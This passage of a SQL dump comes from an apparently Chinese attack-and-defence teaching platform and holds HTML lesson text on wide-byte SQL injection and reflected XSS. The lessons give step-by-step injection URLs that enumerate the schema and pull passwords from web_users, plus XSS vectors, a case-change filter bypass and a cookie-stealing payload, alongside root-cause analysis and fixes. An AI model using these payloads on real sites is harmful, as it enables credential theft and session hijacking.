src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8DA5.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%876.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,column_name%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>information_schema.columns%<span class=\"hljs-number\">20</span>where%<span class=\"hljs-number\">20</span>table_name=<span class=\"hljs-number\">0x7765625F7573657273</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>limit%<span class=\"hljs-number\">204</span>,<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">23</span></code></pre><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%877.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,column_name%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>information_schema.columns%<span class=\"hljs-number\">20</span>where%<span class=\"hljs-number\">20</span>table_name=<span class=\"hljs-number\">0x7765625F7573657273</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>limit%<span class=\"hljs-number\">205</span>,<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8DA7.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%878.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>%bf%<span class=\"hljs-number\">27 </span>union select password,user from web_users limit <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span> %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wps8DB7.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%879.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>&nbsp;</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/sql%E6%A0%872.jpg','index.tenxcloud.com/dubuqingfeng/platform-web-test1:latest','2016-09-11 15:26:08',1,NULL,'<p>分析与思考：</p><p>1）&nbsp;宽字节sql注入的原理分析</p><p>通过上面的实验步骤我们可以得到用户的账号和加密后的密码。用此密码直接做md5解密即可得到明文的密码。实验过后我们来通过源代码详细分析一下这个漏洞产生的原理。</p><p>首先我们看下数据库的当前编码</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps8DB8.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%8710.png\"></p><p>从上面的编码可以看出数据库的编码为latin1</p><p>通过查看代码我们发现，在链接数据的时候编码被设置成为了gbk编码</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps8DB9.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%8711.png\"></p><p>这就导致编码不统一产生了sql注入的问题，具体为什么编码不统一会产生sql注入我们下面继续分析。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps8DBA.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%8712.png\"></p><p>从上面的代码可以看出系统使用了addslashes()函数对接收进来的参数做转义，这个函数具体的转义的内容可查看php中对于这个函数的说明。一般情况来说会将</p><p><span style=\"font-family: Menlo, Monaco, Consolas, \'Courier New\', monospace; font-size: inherit; line-height: 1.5; white-space: pre-wrap; background-color: rgb(248, 248, 248);\">{‘ ---&gt; \\\',\" -----&gt; \\\" , \\ ----&gt; \\\\}</span>。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps8DBB.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%8713.png\"></p><p>从上图中可以看出我们输入%27（’）的时候直接转义成\\’。通过转义以后是不能造成sql注入的。所以如果我们要能造成sql注入从转义以后的结果就知道有两种处理方案。第一种吧这个反斜杠吃掉，让单引号单独起作用这样可以造成sql注入；第二种吧这个反斜杠转义掉，不要让这个反斜杠转义我们输入的单引号。</p><p>现在我们来看具体的分析。当我们输入%bf%27的时候我们发现报错了。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wps8DCC.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk1%E5%9B%BE%E7%89%8714.png\"></p><p>报错了说明就可以注入。通过报错可以看出%27（’）被用来转义的反斜杠不见了。变成了一个不认识的汉字。这里就就要讲到一个mysql在编码时的一个特性。Mysql数据在编码gbk的时候吧两个字符当成一个汉字来处理。此时我们在id=1后面输入一个%bf%27最终到数据库的时候变成了%bf%5c%27其中%5c代表反斜杠（\\）。数据连接的时候把两个字符当成一个汉字来编码所以%bf%5c被编码成图中的汉字。由于数据库连接的编码和实际数据库中的编码不一直所以成了乱码。这样%27单独逃逸出来。造成了注入。</p><p>备注：gbk编码的时候2个字节编码成一个汉字。汉字的范围第一个字节 0x81-0xfe 第二个字节 0x40-0xfe。也就是说第一个字节的asscii码必须大于128。因此上面的注入语句可以灵活使用%a1 %df %cf等等的都可以用来测试宽字节注入。</p><p>2）&nbsp;宽字节sql注入的防范</p><p>知道上了面的原理以后要防范就很容易了。只要在数据库连接的时候前后编码，并且使用二进制流传输数据即可。具体设置如下：</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">mysql_query(<span class=\"hljs-string\">\"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary\"</span>, $conn); 或者\r\n\r\nmysql_query(<span class=\"hljs-string\">\"SET character_set_connection=utf-8, character_set_results=utf-8,character_set_client=binary\"</span>, $conn); </code></pre><p>3）&nbsp;思考与说明</p><p>通过上面的分析学员应该基本掌握宽字节注入的原理和过程。细心的学员应该发现在1）中我们说了两种情况来造成sql注入。一种是吃掉反斜杠，这节课的内容就是关于吃掉反斜杠的问题。还有一种是转义掉反斜杠使单引号单独逃逸出来。这个问题我们下一节课继续讲解。</p><p><br></p>',1,''),(21,'宽字节注入训练二','通过攻防教学实验系统中的web系统做宽字节sql注入练习，并且深刻认识掌握其原理，从而理解sql注入在不同场景中的应用。','<h1><span style=\"color: inherit; font-family: inherit; font-size: 30px;\">实验步骤：</span><br></h1><p>1）&nbsp;在WEB系统中通过之前学习的宽字节sql注入的方式看看能否得到数据库中的敏感数据</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE32E.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%871.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>从上面的图中我们可以看出使用上一节我们讲解的宽字节注入方式没法报错</p><p>2）&nbsp;在WEB系统中的参数后面加入恶意字符测试，查看是否报错；下面为这节课宽字节注入得到关键数据的语句</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span>&action=medium</code></pre><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%872.png\"><br></p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE32F.tmp.jpg\">从图中可以确实报错了，说明注入是存在的。&nbsp;</p><p>通过一些语句得到数据库敏感信息，具体的测试语句和上一节中使用的语句差不多</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span>order%<span class=\"hljs-number\">20</span>by%<span class=\"hljs-number\">202</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE330.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%873.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span>order%<span class=\"hljs-number\">20</span>by%<span class=\"hljs-number\">203</span>%<span class=\"hljs-number\">23</span></code></pre><p>测试查询语句存在的字段数</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE331.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%874.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>从上面的报错结果可以看出order by 的列数有两个</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span> union select <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span> %<span class=\"hljs-number\">23</span></code></pre><p>页面显示数字的地方表示可以返回数据</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE332.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%875.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span> union select <span class=\"hljs-number\">1</span>,database() %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE343.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%876.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>注：database()可替换成其它mysql函数(如:version(),@@basedir等)</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span>union select <span class=\"hljs-number\">1</span>,table_name from information_schema.tables where table_schema=<span class=\"hljs-number\">0x77656274657374</span>  %<span class=\"hljs-number\">23</span></code></pre><p>注：table_schema=[库名]，库名要转换成16进制。</p><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE344.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%877.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span> union select <span class=\"hljs-number\">1</span>,column_name from information_schema.columns where table_name=<span class=\"hljs-number\">0x7765625F7573657273</span>  %<span class=\"hljs-number\">23</span></code></pre><p>注：table_name=[表名]，表名要转换成16进制。</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span> union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,column_name%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>information_schema.columns%<span class=\"hljs-number\">20</span>where%<span class=\"hljs-number\">20</span>table_name=<span class=\"hljs-number\">0x7765625F7573657273</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>limit%<span class=\"hljs-number\">204</span>,<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE345.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%878.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span>union%<span class=\"hljs-number\">20</span>select%<span class=\"hljs-number\">201</span>,column_name%<span class=\"hljs-number\">20</span>from%<span class=\"hljs-number\">20</span>information_schema.columns%<span class=\"hljs-number\">20</span>where%<span class=\"hljs-number\">20</span>table_name=<span class=\"hljs-number\">0x7765625F7573657273</span>%<span class=\"hljs-number\">20</span>%<span class=\"hljs-number\">20</span>limit%<span class=\"hljs-number\">205</span>,<span class=\"hljs-number\">1</span>%<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE346.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%879.png\" style=\"line-height: 1; max-width: 100%;\"></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">/vulnerabilities/web/Sql/sqli_wide/index.php?action=medium&amp;id=<span class=\"hljs-number\">1</span>錦%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">20</span> union select password,user from web_users limit <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span> %<span class=\"hljs-number\">23</span></code></pre><p><img src=\"file:///C:\\Users\\xinxi\\AppData\\Local\\Temp\\ksohtml\\wpsE347.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8710.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/sql%E6%A0%872.jpg','index.tenxcloud.com/dubuqingfeng/platform-web-test1:latest','2016-09-11 15:39:50',1,NULL,'<h2>分析与思考：</h2><p>1）&nbsp;宽字节sql注入的原理分析</p><p>通过上面的实验步骤我们可以得到用户的账号和加密后的密码。用此密码直接做md5解密即可得到明文的密码。实验过后我们来通过源代码详细分析一下这个漏洞产生的原理。</p><p>首先我们看下数据库的当前编码</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wpsE348.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8711.png\"></p><p>从上面的编码可以看出数据库的编码为latin1</p><p>通过查看代码我们发现，在链接数据的时候编码被设置成为了gbk编码</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wpsE349.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8712.png\"></p><p>而且客户端的编码和连接的编码都设置成了gbk。细心的朋友应该想到上一节我们在后面说到宽字节修复的时候用的就是这个方法。所以这个时候我们通过之前的宽字节代码是不能报错的。那么问题到底出在什么地方呢？我们继续往下面看。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wpsE34A.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8713.png\"></p><p>通过上面的代码我们发现一个特别的函数。iconv()。这个函数的具体含义大家可以查看php的手册。是一个编码转换的函数，在本系统的意思是，将utf-8转换成gbk编码。</p><p>Mysql在做utf-8编码的时候是3个字节当成一个汉字，做gbk编码的时候是2个字节当成一个汉字。所造成了编码转换的时候出现乱码。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wpsE34B.tmp.jpg\">&nbsp;</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wpsE36B.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8714.png\"></p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8715.png\"></p><p>{錦}这个汉字的utf-8和gbk的url编码分别为%e9%8c%a6和%e5%5c所以在编码转换的时候反斜杠前面已经说了是%5c这样就导致utf-8转gbk以后变成</p><p>%e5%5c%5c%27导致用来转义的反斜杠{%5c}被输入的转义掉了导致单引号逃逸了，造成了注入。</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wpsE36C.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8716.png\"></p><p>如果了解了编码转换来带的问题从上面的报错信息其实也可以看出{錦}这个汉子代表的是%e5%5c后面再加{\\’}所以{\\}被转义了，单引号逃逸了。</p><p>2）&nbsp;宽字节sql注入的防范</p><p>知道上了面的原理以后要防范就很容易了。只要在数据库连接的时候前后编码，并且使用二进制流传输数据即可。具体设置如下：</p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\">mysql_query(<span class=\"hljs-string\">\"SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary\"</span>, $conn); 或者\r\n\r\nmysql_query(<span class=\"hljs-string\">\"SET character_set_connection=utf-8, character_set_results=utf-8,character_set_client=binary\"</span>, $conn); </code></pre><p>这个设置本身是没有问题，问题在于写代码的人不了解编码转码的原理，导致画蛇添足，造成的注入。只要前后编码统一是不需要做编码转换的。针对本节课中的内容直接去掉</p><p><img src=\"file:///C:/Users/xinxi/AppData/Local/Temp/ksohtml/wpsE36D.tmp.jpg\">&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/sqlk2%E5%9B%BE%E7%89%8717.png\"></p><p>这行代码即可修复。</p><p>3）&nbsp;思考与说明</p><p></p><p>通过这两节课的讲解，应该对宽字节注入的原理有了深刻的认识。希望以后在编写代码，或者做源码审计的时候多注意，多留心。</p><p><br></p>',1,''),(22,'反射型XSS基础训练一','通过攻防教学实验系统中的web系统做反射型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用','<h2><span style=\"font-size: 14px; background-color: rgb(128, 128, 0);\">1）在WEB系统中通过学习反射型XSS看看能否得到一些敏感数据</span><br></h2><p><span style=\"background-color: rgb(128, 128, 0);\">2）在WEB系统中的参数后面加入恶意字符测试；下面为反射型XSS得到用户数据的语句</span></p><p><span style=\"background-color: rgb(128, 128, 0);\">Xss的一些常用基本测试代码:</span></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span style=\"background-color: rgb(128, 128, 0);\">&gt;<span class=\"hljs-string\">\"&gt;&lt;script&gt;alert(\"</span>XSS<span class=\"hljs-string\">\")&lt;/script&gt;&amp; \"</span>&gt;&lt;STYLE&gt;@import<span class=\"hljs-string\">\"javascript:alert(XSS)\"</span>;&lt;/STYLE&gt; ;!--<span class=\"hljs-string\">\"&lt;XSS&gt;=&amp;{()} &lt;IMG SRC=\"</span>javascript:alert(XSS);<span class=\"hljs-string\">\"&gt; &lt;IMG SRC=javascript:alert(XSS)&gt; &lt;IMG SRC=JaVaScRiPt:alert(\"XSS&lt;WBR&gt;\")&gt;</span></span></code></pre><p><span style=\"background-color: rgb(128, 128, 0);\">在web系统中使用测试代码添加在NAME参数后面提交访问；弹框提示/XSS/的信息，则测试成功</span></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span style=\"background-color: rgb(128, 128, 0);\">vulnerabilities/web/Xss/xss_r/index.php?name=<span class=\"hljs-number\">1</span>&lt;script&gt;alert(<span class=\"hljs-number\">1</span>)&lt;/script&gt;</span></code></pre><p><span style=\"background-color: rgb(128, 128, 0);\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r1.png\"><br></span></p><p><span style=\"background-color: rgb(128, 128, 0);\">备注：测试的时候请注意直接在浏览器输入测试语句是请使用ie浏览器。因为google浏览器直接输入会做拦截。如果要使用google浏览器请使用抓包软件提交测试poc。</span></p><p><span style=\"background-color: rgb(128, 128, 0);\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r2.png\"><br></span></p><p><span style=\"background-color: rgb(128, 128, 0);\"><v:shape type=\"#_x0000_t75\" style=\"width:432.75pt;height:156pt;visibility:visible\"></v:shape></span></p><p><span style=\"background-color: rgb(128, 128, 0);\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r3.png\"><br></span></p><p><span style=\"background-color: rgb(128, 128, 0);\">把alert(1)改为<span style=\"font-size: inherit; font-family: Menlo, Monaco, Consolas, \'Courier New\', monospace; line-height: 1.5; white-space: pre-wrap;\">alert(document.cookie)</span>可获取用户cookie信息</span></p><p><span style=\"background-color: rgb(128, 128, 0);\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r4.png\"><br></span></p><p><span style=\"background-color: rgb(128, 128, 0);\">得到用户cookie以后就可以直接使用cookie登陆用户系统。</span></p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/xss3.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:06:41',1,NULL,'<h2><span style=\"background-color: rgb(128, 128, 0);\"><span style=\"font-size: 14px;\">1）反射型XSS漏洞的原理</span><br></span></h2><p><span style=\"background-color: rgb(128, 128, 0);\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r21.png\"><br></span></p><p><span style=\"background-color: rgb(128, 128, 0);\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r22.png\"><br></span></p><p><span style=\"background-color: rgb(128, 128, 0);\">从上面服务端的代码我们基本可以看出，服务端通过get方式得到前端输入的用户数据以后没有做任何过滤。直接赋值给html做了后面的输出。导致反射型xss的产生。</span></p><p><span style=\"background-color: rgb(128, 128, 0);\">2）反射型XSS漏洞的防范</span></p><p><span style=\"background-color: rgb(128, 128, 0);\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r23.png\"><br></span></p><p><span style=\"background-color: rgb(128, 128, 0);\">通过这个输出点可以看到，最终输出到&lt;font&gt;&lt;/font&gt;标签之间了。所以原则上可以直接过滤掉&lt;，&gt;即可。通过html实体编码转换即可。</span></p><p><span style=\"background-color: rgb(128, 128, 0);\">针对本系统可以直接采用php自带的html实体编码函数过滤。</span></p><pre style=\"max-width: 100%;\"><code class=\"php hljs\" codemark=\"1\"><span style=\"background-color: rgb(128, 128, 0);\">htmlspecialchars($_GET[<span class=\"hljs-string\">\'name\'</span>]);</span></code></pre><p><span style=\"background-color: rgb(128, 128, 0);\">通过这种方式过滤即可。</span></p><p><span style=\"background-color: rgb(128, 128, 0);\">3）Xss防范总结</span></p><p><span style=\"background-color: rgb(128, 128, 0);\">这里我们详细介绍一下xss的防范措施。</span></p><p><span style=\"background-color: rgb(128, 128, 0);\">情况一：类似本系统这种的最终的输出在html标签之间的比如&lt;div&gt;**&lt;/div&gt;输出在**位置，原则上可以直接过滤掉左右尖括弧{&lt;，&gt;}就可以了。直接替换成空格或者做html实体编码都可以。</span></p><p><span style=\"background-color: rgb(128, 128, 0);\">情况二：如果最终的输出在html标签之内比如&lt;img src=”**”&gt;或者&lt;img src=’**’&gt;输出位置在**,原则上如果这个标签使用双引号{“ ”}做保护则过滤双引号就可以了，如果是单引号{‘ ’}做保护则过滤单引号就可以了。具体的过滤方式可以替换成空格或者直接做html实体编码转换。</span></p><p></p><p><span style=\"background-color: rgb(128, 128, 0);\">情况三：这种情况稍微复杂一些，主要是在一些富文本比较常见。其特性也和浏览器的编码解码顺序有关，经常用在一些绕过xss的技巧当中。后面们的中级课程当中会单独去讲解。</span></p><p><br></p>',1,'<p>暂无</p><p><br></p>'),(23,'反射型XSS基础训练二','反射型XSS基础训练二 的描述','<h1><span style=\"font-size: 14px;\">1）在WEB系统中通过学习反射型XSS看看能否得到一些敏感数据</span><br></h1><p>2）在WEB系统中的参数后面加入恶意字符测试；下面为反射型XSS得到用户数据的语句</p><p>Xss的一些常用基本测试代码:</p><p>&gt;\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&amp;\r\n\"&gt;&lt;STYLE&gt;@import\"javascript:alert(XSS)\";&lt;/STYLE&gt;\r\n;!--\"&lt;XSS&gt;=&amp;{()}\r\n&lt;IMG SRC=\"javascript:alert(XSS);\"&gt;\r\n&lt;IMG SRC=javascript:alert(XSS)&gt;\r\n&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&lt;WBR&gt;&amp;quot;)&gt;</p><p>在web系统中使用测试代码添加在NAME参数后面提交访问；弹框提示cookie信息，则测试成功。</p><p>vulnerabilities/web/Xss/xss_r/index.php?action=medium&amp;name=1&lt;script&gt;alert(document.cookie)&lt;/script&gt;</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:211.5pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/r21.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>从上面的图中可以看出并没有弹当前登陆的用户cookie。</p><p>备注：测试的时候请注意直接在浏览器输入测试语句是请使用ie浏览器。因为google浏览器直接输入会做拦截。如果要使用google浏览器请使用抓包软件提交测试poc。</p><p>vulnerabilities/web/Xss/xss_r/index.php?action=medium&name=1&lt;sCript&gt;alert(document.cookie)&lt;/sCript&gt;</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/r22.png\"></p><br><p>通过上面的poc测试发现弹出了用户登陆的cookie。</p><p>得到用户cookie以后就可以直接使用cookie登陆用户系统。具体的操作方法可以使用抓包软件抓目前登陆的数据包然后直接替换cookie。</p><p><br></p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/xss3.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:07:17',1,NULL,'<h2><span style=\"font-size: 14px;\">1）反射型XSS漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/r23.png\"></p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/r24.png\"></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"></p><p>从上面服务端的代码我们基本可以看出，服务端通过get方式得到前端输入的用户数据以后使用了str_replace函数直接将&lt;script&gt;标签替换成了空值。所以第一次直接输入&lt;script&gt;alert(document.cookie)&lt;/script&gt;的时候没不能造成xss注入。后面我们变换了大小写可以造成xss注入。这里是一个简单的绕过防xss的案例。后面我们会讲解更多的关于xss绕过的技巧。</p><p>2）反射型XSS漏洞的防范</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/r25.png\"></p><p>通过这个输出点可以看到，最终输出到&lt;font&gt;&lt;/font&gt;标签之间了。所以原则上可以直接过滤掉&lt;，&gt;即可。通过html实体编码转换即可。</p><p>针对本系统可以直接采用php自带的html实体编码函数过滤。</p><p>htmlspecialchars($_GET[\'name\']);</p><p>通过这种方式过滤即可。</p><p>3）Xss防范总结</p><p>这里我们详细介绍一下xss的防范措施。</p><p>情况一：类似本系统这种的最终的输出在html标签之间的比如&lt;div&gt;**&lt;/div&gt;输出在**位置，原则上可以直接过滤掉左右尖括弧{&lt;，&gt;}就可以了。直接替换成空格或者做html实体编码都可以。</p><p>情况二：如果最终的输出在html标签之内比如&lt;img src=”**”&gt;或者&lt;img 